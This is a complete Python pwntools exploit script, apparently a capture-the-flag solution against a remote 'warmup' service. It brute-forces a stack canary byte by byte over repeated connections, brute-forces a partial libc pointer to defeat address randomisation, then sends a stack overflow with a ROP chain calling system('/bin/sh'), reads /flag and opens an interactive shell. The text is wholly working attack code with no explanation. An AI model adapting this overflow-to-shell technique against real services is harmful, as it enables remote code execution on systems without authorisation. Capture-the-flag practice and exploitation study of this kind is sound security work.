from pwn import *

HOST = '34.76.152.107'
libc = context.binary = ELF('./libc.so.6')
#p = process('./warmup')
p = remote(HOST,17012)
p.recvuntil(b'port ')
PORT = int(p.recvuntil(b"\n"))

canary = b"\x00"
ok = 0
while ok < 7:
    for guess in range(255,-1,-1):
        q = remote(HOST,PORT)
        context.log_level = "warn"
        payload = cyclic(56) + canary + bytes([guess])
        q.send(payload)

        try:
            q.recvuntil(b"stack",timeout=1)
            q.close()
        except EOFError:
            ok += 1
            canary += bytes([guess])
            print("canary: ", canary)
            q.close()
            break
    else:
        break

print(f"full canary: {hex(unpack(canary,'all'))}")
print("bro cooking for libc...")

ok = 0
libc_leak = b"\x76"
#libc_leak = b""
while ok < 6:
    for guess in range(255,-1,-1):
        q = remote(HOST, PORT)
        context.log_level = "warn"
        payload = cyclic(56) + canary + p64(0) + libc_leak + bytes([guess])
        q.send(payload)
        helper = q.recvrepeat(timeout=3)
        if b"helper" in helper:
            print("libc: ", libc_leak)
            libc_leak += bytes([guess])
            ok += 1
            q.close()
            break
        q.close()

print(f"full libc leak: {hex(unpack(libc_leak, 'all'))}")
libc.address = unpack(libc_leak,'all') - 0x23a76

q = remote(HOST,PORT)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

payload = cyclic(56) + canary + p64(0) + bytes(rop)

q.send(payload)
sleep(5)

q.sendline(b"cat /flag")

q.interactive()

p.close()
